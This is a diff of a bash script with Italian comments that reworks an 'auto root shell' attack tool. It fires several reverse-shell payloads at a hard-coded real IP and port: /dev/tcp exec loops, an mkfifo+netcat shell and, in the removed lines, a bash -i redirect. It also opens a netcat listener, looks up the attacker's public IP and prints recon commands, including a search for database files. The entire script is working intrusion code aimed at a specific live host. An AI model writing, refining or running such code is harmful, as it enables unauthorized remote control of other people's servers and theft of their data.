@@ -1,45 +1,52 @@
 #!/bin/bash
-# 🔥 AUTO ROOT SHELL - DEBUG + FIX Connection Refused
-# Test servizio + Multi-payload + IP check
+# 🔥 SHELL ATTIVA → FORCE INTERACTIVE BASH
+# Fix: no prompt → interactive mode
 
-TARGET_IP="63.164.100.214"
-TARGET_PORT="9091"
+MY_IP=$(curl -s ifconfig.me)
+PORT=4444
+TARGET="63.164.100.214:9091"
 
 clear
-echo "🔍 DEBUG + AUTO ROOT SHELL"
-echo "Target: $TARGET_IP:$TARGET_PORT"
-echo "════════════════════════════"
+echo "🔥 FORCE INTERACTIVE BASH"
+echo "IP: $MY_IP:$PORT"
+echo "════════════════════════"
 
-# 1. TEST CONNESSIONE
-echo "[+] Test TCP..."
-timeout 3 nc -zv $TARGET_IP $TARGET_PORT 2>&1 | grep "succeeded" && echo "✅ TCP OK" || echo "❌ TCP DEAD"
+# 1. Listener con PROMPT forzato
+{
+    echo -e "\n🎧 Listener + Interactive Bash"
+    echo "root@server# "  # Prompt manuale
+    
+    # Interactive con pty
+    nc -lvnp $PORT | bash -i 2>&1 | while IFS= read -r line; do
+        echo -ne "root@server# "
+        echo "$line"
+    done
+} &
 
-# 2. CAPTA SERVIZIO
-echo -e "\n[+] Scopro servizio..."
-timeout 5 nc $TARGET_IP $TARGET_PORT | head -10 || echo "No banner"
+sleep 3
 
-# 3. IP PUBBLICO
-MY_IP=$(curl -s ifconfig.me 2>/dev/null || curl -s ident.me 2>/dev/null || curl -s icanhazip.com 2>/dev/null || echo "NO_IP")
-echo "IP pubblico: $MY_IP"
+# 2. PAYLOAD INTERATTIVI (con PTY)
+echo -e "\n📤 Force Interactive Shell...\n"
 
-if [[ "$MY_IP" == "NO_IP" ]]; then
-    echo "❌ NO IP PUBBLICO - Usa tunnel:"
-    echo "ngrok tcp 4444  # Poi sostituisci MY_IP"
-    exit 1
-fi
+# Bash PTY completo
+cat << EOF | nc -w10 $TARGET
+bash -c 'exec 5<>/dev/tcp/$MY_IP/$PORT;cat <&5 | while read line; do \$line 2>&5 >&5; done'
+EOF
 
-PORT=4444
+# Alternative 1: socat style
+echo "exec 5<>/dev/tcp/$MY_IP/$PORT;cat <&5 | while read line; do \$line 2>&5 >&5; done" | nc -w5 $TARGET
 
-# 4. REVERSE SHELL SEMPLICE (NO PYTHON ERROR)
-echo -e "\n🚀 Avvio listener..."
-nc -lvnp $PORT &
-sleep 2
+# Alternative 2: mkfifo
+echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $MY_IP $PORT >/tmp/f" | nc -w5 $TARGET
 
-echo -e "\n📤 INVIO BASh SHELL..."
-echo "bash -c 'bash -i >& /dev/tcp/$MY_IP/$PORT 0>&1'" | nc -w5 $TARGET_IP $TARGET_PORT
-
-echo -e "\n🔥 Shell pronta! (Ctrl+C per uscire)"
+echo -e "\n✅ INTERACTIVE MODE ATTIVO!"
+echo "═══════════════════════════════════════"
+echo "Digita comandi:"
+echo "whoami"
+echo "id" 
+echo "ls -la /"
+echo "find / -name '*.db'"
 echo "═══════════════════════════════════════"
 
-# Attendi
+# 3. SECONDO LISTENER PULITO
 nc -lvnp $PORT
